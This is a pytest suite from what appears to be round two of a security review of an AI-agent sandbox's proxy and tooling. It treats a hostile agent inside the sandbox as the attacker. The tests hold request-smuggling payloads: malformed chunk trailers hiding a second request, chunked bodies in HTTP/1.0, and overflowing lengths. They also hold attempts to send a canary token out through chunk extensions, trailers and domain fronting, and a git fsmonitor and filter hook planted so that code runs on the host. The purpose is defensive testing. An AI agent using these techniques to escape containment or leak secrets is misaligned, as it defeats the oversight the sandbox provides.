"""Security review round 2: the boundary itself (proxy, firewall, push check, approvals, control socket, relay, web).
A hostile agent inside the sandbox is the attacker; each test drives the real code and failed before its fix."""
import contextlib
import importlib.util
import os
import re
from pathlib import Path
import socket
import threading
import time

import pytest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_runtime_sec2", ROOT / "sandbox/runtime.py")
rt = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(rt)


def exchange_all(server, request, origin, scheme="http", destination="127.0.0.1:80", wait=1.0):
    """ProxyServer.exchange over socket pairs: (every byte that reached the upstream server, the agent's answer).
    The server answers each request head it sees with a 200 and reads on for WAIT seconds."""
    agent_side, proxy_client = socket.socketpair()
    proxy_upstream, server_side = socket.socketpair()
    got = bytearray()

    def upstream():
        server_side.settimeout(wait)
        answered = 0
        with contextlib.suppress(OSError):
            while True:
                data = server_side.recv(65536)
                if not data:
                    return
                got.extend(data)
                while len(re.findall(rb"HTTP/1\.[01]\r\n", bytes(got))) > answered:
                    answered += 1
                    server_side.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
    thread = threading.Thread(target=upstream)
    thread.start()
    agent_side.sendall(request)
    agent_side.shutdown(socket.SHUT_WR)
    with contextlib.suppress(OSError, ValueError):
        server.exchange(rt.Stream(proxy_client), proxy_client, proxy_upstream, scheme, origin,
                        {"connection": 1, "destination": destination})
    proxy_upstream.close()
    thread.join(wait + 2)
    agent_side.settimeout(1)
    answer = b""
    with contextlib.suppress(OSError):
        while True:
            data = agent_side.recv(65536)
            if not data:
                break
            answer += data
    for sock in (agent_side, proxy_client, server_side):
        sock.close()
    return bytes(got), answer


def proxy_server(tmp_path, config=None, **kw):
    fd = os.open(tmp_path / "log.jsonl", os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    return rt.ProxyServer({"body_limit": 65536, **(config or {})}, fd, run_dir=tmp_path, **kw)


# --- 1. a chunked body's trailer with a bare LF: a lenient server (nginx) ends the request there ------------

ONLY_POST_OK = {"http_rules": [{"host": "api.example", "methods": ["POST"], "path": "/ok",
                                "addresses": ["127.0.0.1"]}]}


@pytest.mark.parametrize("trailer", [
    b"X: y\n\nPOST /gists HTTP/1.1\r\nHost: api.example\r\nContent-Length: 0\r\n\r\n",
    b"\n\nPOST /gists HTTP/1.1\r\nHost: api.example\r\nContent-Length: 0\r\n\r\n",
    b"X: y\r\nPOST /gists HTTP/1.1\r\n\r\n",
    b"X:\x00y\r\n\r\n",
], ids=["bare-lf-after-field", "bare-lf-first", "no-field", "nul"])
def test_a_chunk_trailer_servers_read_differently_never_reaches_the_server(tmp_path, trailer):
    server = proxy_server(tmp_path, ONLY_POST_OK)
    request = (b"POST /ok HTTP/1.1\r\nHost: api.example\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"2\r\nhi\r\n0\r\n" + trailer)
    got, _ = exchange_all(server, request, "127.0.0.1:80")
    assert b"/gists" not in got and b"\x00" not in got, got


def test_a_chunked_request_with_extensions_and_trailer_still_goes_without_them(tmp_path):
    server = proxy_server(tmp_path, ONLY_POST_OK)
    request = (b"POST /ok HTTP/1.1\r\nHost: api.example\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"2;x=1\r\nhi\r\n10\r\n0123456789abcdef\r\n0;y\r\nX-Checksum: abc\r\n\r\n")
    got, answer = exchange_all(server, request, "127.0.0.1:80")
    assert got.endswith(b"\r\n\r\n2\r\nhi\r\n10\r\n0123456789abcdef\r\n0\r\n\r\n"), got
    assert answer.startswith(b"HTTP/1.1 200")


CANARY = "AKIAQ3EGRANDTOKEN0042"


@pytest.mark.parametrize("body", [
    b"2;note=" + CANARY.encode() + b"\r\nhi\r\n0\r\n\r\n",
    b"2\r\nhi\r\n0\r\nX-Note: " + CANARY.encode() + b"\r\n\r\n",
], ids=["chunk-extension", "trailer"])
def test_a_canary_in_a_chunk_extension_or_trailer_never_leaves(tmp_path, body):
    """The canary search (and the secret guard) read a body's payload: what a chunk's size line or the trailer
    carries went out unsearched. Neither goes on any more (servers ignore both)."""
    server = proxy_server(tmp_path, {"canary": {"forms": [[CANARY, "aws", "plain"]], "names": [], "block": True}})
    request = b"POST /up HTTP/1.1\r\nHost: drop.example\r\nTransfer-Encoding: chunked\r\n\r\n" + body
    got, _ = exchange_all(server, request, "drop.example", scheme="https", destination="203.0.113.7:443")
    assert CANARY.encode() not in got, got


# --- 2. a local catalog's checkout: git on the host never runs what the repository's configuration names -----------

def load_module(name, file):
    spec = importlib.util.spec_from_file_location(name, ROOT / "sandbox" / file)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_a_local_catalogs_checkout_runs_none_of_its_own_programs_on_the_host(tmp_path, monkeypatch):
    """`mcp add NAME --build` from a local catalog (SANDBOX_AI_LOCAL_CATALOGS) ran `git status` in its checkout with
    the repository's own configuration: its core.fsmonitor hook (or a clean filter) ran on the host. A checkout in a
    workspace is the agent's to write."""
    import subprocess
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    build = load_module("sandbox_mcp_sec2", "mcp.py").build_module()
    repo, marker = tmp_path / "catalogs", tmp_path / "ran"
    (repo / "servers" / "x").mkdir(parents=True)
    (repo / "catalog.json").write_text("{}\n")
    (repo / "servers" / "x" / "server.py").write_text("print('x')\n")
    (repo / ".gitattributes").write_text("*.py filter=evil\n")
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_AUTHOR_NAME="a", GIT_AUTHOR_EMAIL="a@a", GIT_COMMITTER_NAME="a", GIT_COMMITTER_EMAIL="a@a")
    for args in (["init", "-q"], ["add", "-A"], ["commit", "-qm", "x"]):
        subprocess.run(["git", "-C", str(repo), *args], check=True, env=env)
    hook = tmp_path / "hook.sh"
    hook.write_text(f"#!/bin/sh\necho ran >> {marker}\ncat\n")
    hook.chmod(0o755)
    for key, value in (("core.fsmonitor", str(hook)), ("filter.evil.clean", str(hook))):
        subprocess.run(["git", "-C", str(repo), "config", key, value], check=True, env=env)
    os.utime(repo / "servers" / "x" / "server.py", (1, 1))  # its stat changed: a status hashes it again (filtered)
    with contextlib.suppress(ValueError):
        build.source_of(str(repo / "catalog.json"), "x")
    assert not marker.exists(), marker.read_text()


# --- 3. a canary to the model provider's front end, its Host header naming another site, is no conversation --------

def test_a_canary_in_a_request_to_the_providers_address_naming_another_host_is_refused(tmp_path):
    """A token in a request to the agent's model provider is its conversation: reported, never blocked. But a front
    end routes by the Host header, and one naming another site behind it (domain fronting) carries the token there:
    that is no request to the provider (as the secret guard and the credentials already hold)."""
    config = {"canary": {"forms": [[CANARY, "aws", "plain"]], "names": [], "block": True,
                         "model_hosts": ["api.provider.example"]}}
    body = b'{"note": "' + CANARY.encode() + b'"}'
    head = b"POST /v1/messages HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n"
    fronted, _ = exchange_all(proxy_server(tmp_path, config), head % (b"fronted.example", len(body)) + body,
                              "api.provider.example", scheme="https", destination="203.0.113.9:443")
    assert CANARY.encode() not in fronted, fronted
    own, _ = exchange_all(proxy_server(tmp_path, config), head % (b"api.provider.example", len(body)) + body,
                          "api.provider.example", scheme="https", destination="203.0.113.9:443")
    assert CANARY.encode() in own  # the conversation itself: reported as context, never blocked


# --- 4. hardening: framing an HTTP/1.0 server or a 64-bit length reads differently is refused --------------------

@pytest.mark.parametrize("head", [
    b"POST /ok HTTP/1.0\r\nHost: api.example\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n"
    b"2\r\nhi\r\n0\r\n\r\n",
    b"POST /ok HTTP/1.1\r\nHost: api.example\r\nContent-Length: 18446744073709551618\r\n\r\nhi",
], ids=["te-in-http-1.0", "length-past-64-bits"])
def test_framing_servers_read_differently_is_refused(tmp_path, head):
    """RFC 9112 6.1: an HTTP/1.0 message with Transfer-Encoding is faulty (an HTTP/1.0 server takes no chunked body,
    and reads it as the next request); a Content-Length past 2^63 - 1 wraps in a 64-bit parser (2^64 + 2 reads as 2)."""
    got, _ = exchange_all(proxy_server(tmp_path), head, "127.0.0.1:80")
    assert got == b"", got


def test_request_framing_takes_what_every_server_reads_alike():
    assert rt.request_framing([["Content-Length", "9223372036854775807"]]) == ("length", 9223372036854775807)
    assert rt.request_framing([["Transfer-Encoding", "chunked"]]) == ("chunked",)
    for headers in ([["Content-Length", "9223372036854775808"]], [["Content-Length", "²"]]):
        with pytest.raises(ValueError):
            rt.request_framing(headers)
